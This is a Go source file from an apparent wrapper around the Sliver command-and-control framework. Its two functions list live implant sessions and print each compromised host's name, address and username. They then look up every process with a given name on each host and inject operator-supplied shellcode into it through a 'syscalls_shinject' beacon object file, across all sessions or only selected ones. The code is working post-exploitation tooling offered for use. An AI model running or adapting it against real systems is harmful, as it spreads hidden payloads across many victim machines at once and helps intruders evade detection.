package dispatch

import (
	"context"
	"fmt"
	"sliver-dispatch/utils"
	"sliver-dispatch/globals"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func Shinject(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 2 {
		fmt.Println("Need the full path to shellcode and a system process name to inject to.")
		return
	}

	path_shc := args[0]
	processName := args[1]

	var sessions *clientpb.Sessions
	var err error
	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		utils.Eprint("Error listing sessions: %s", err.Error())
	}

	var session *clientpb.Session
	var ps_task *sliverpb.Ps
	for _, session = range sessions.GetSessions() {
		var pids []int
		if !session.IsDead {

			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			ps_task, err = rpc.Ps(
				context.Background(),
				&sliverpb.PsReq{
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})

			if err != nil {
				utils.Eprint("Something went wrong with the process listing tasking: %s", err.Error())
			}
			for _, p := range ps_task.Processes {
				if p.Executable == processName {
					pids = append(pids, int(p.Pid))
				}
			}

			if len(pids) == 0 {
				utils.Eprint("Could not find a %s process!", processName)
				continue
			}

			for _, pid := range pids {
				utils.Dprint("%s pid: %d", processName, pid)

				status := utils.BofExec("syscalls_shinject", []string{strconv.Itoa(pid), path_shc}, session, rpc)
				if status == utils.BOF_ERR_OTHER {
					return
				}
			}
		}
	}
}


func ShinjectOnSelectedSessions(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 2 {
		fmt.Println("Need the full path to shellcode and a system process name to inject to.")
		return
	}

	path_shc := args[0]
	processName := args[1]
	var err error
	var sessions *clientpb.Sessions

	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		utils.Eprint("Error listing sessions: %s", err.Error())
	}

        // Create a map for efficient lookup of selected session IDs (first part only)
        selectedSessionsMap := make(map[string]struct{})
        for _, id := range globals.Selected_Sessions {
                idParts := strings.SplitN(id, "-", 2)
                if len(idParts) > 0 {
                        selectedSessionsMap[idParts[0]] = struct{}{}
                }
        }

	var ps_task *sliverpb.Ps
        for _, session := range sessions.GetSessions() {
                idParts := strings.SplitN(session.ID, "-", 2)
                firstPartID := ""
		var pids []int
                if len(idParts) > 0 {
                        firstPartID = idParts[0]
                }

                if _, isSelected := selectedSessionsMap[firstPartID]; isSelected && !session.IsDead {
			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			ps_task, err = rpc.Ps(
				context.Background(),
				&sliverpb.PsReq{
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})

			if err != nil {
				utils.Eprint("Something went wrong with the process listing tasking: %s", err.Error())
			}
			for _, p := range ps_task.Processes {
				if p.Executable == processName {
					pids = append(pids, int(p.Pid))
				}
			}

			if len(pids) == 0 {
				utils.Eprint("Could not find a %s process!", processName)
				continue
			}

			for _, pid := range pids {
				utils.Dprint("%s pid: %d", processName, pid)

				status := utils.BofExec("syscalls_shinject", []string{strconv.Itoa(pid), path_shc}, session, rpc)
				if status == utils.BOF_ERR_OTHER {
					return
				}
			}
		}
	}
}



